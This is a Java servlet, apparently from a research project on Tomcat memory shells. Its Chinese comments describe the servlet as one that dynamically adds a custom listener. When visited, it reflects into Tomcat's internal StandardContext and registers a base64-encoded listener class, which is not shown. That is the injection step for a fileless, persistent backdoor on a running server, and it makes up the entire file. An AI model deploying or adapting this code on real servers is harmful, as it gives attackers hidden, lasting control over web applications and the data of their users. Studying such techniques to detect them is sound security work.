package com.summer233;

import org.apache.catalina.core.StandardContext;

import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;
import javax.servlet.annotation.WebServlet;

// import static com.summer233.DynamicUtils.LISTENER_CLASS_STRING;
import static com.summer233.DynamicUtils.BASIC_LISTENER_CLASS_STRING_BASE64;


/**
 * 访问这个 Servlet 将会动态添加自定义 Listener
 * 测试版本 Tomcat 8.5.100
 *
 * @author su18,233
 * @origiCodeURL https://github.com/su18/MemoryShell/blob/main/memshell-test/memshell-test-tomcat/src/org/su18/memshell/test/tomcat/AddTomcatListener.java
 */

@WebServlet(name="DynamicAddTomcatListener", urlPatterns = "/dynamicAddListener")
public class AddTomcatListener extends HttpServlet {

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {

        ServletContext servletContext = req.getServletContext();

        StandardContext o = null;

        try {

            // 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象
            while (o == null) {
                Field f = servletContext.getClass().getDeclaredField("context");
                f.setAccessible(true);
                Object object = f.get(servletContext);

                if (object instanceof ServletContext) {
                    servletContext = (ServletContext) object;
                } else if (object instanceof StandardContext) {
                    o = (StandardContext) object;
                }
            }

            // 添加监听器
            // o.addApplicationEventListener(DynamicUtils.getClass(LISTENER_CLASS_STRING).getDeclaredConstructor().newInstance());
            o.addApplicationEventListener(DynamicUtils.getClass(BASIC_LISTENER_CLASS_STRING_BASE64).getDeclaredConstructor().newInstance());

            resp.getWriter().println("tomcat listener added");

        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}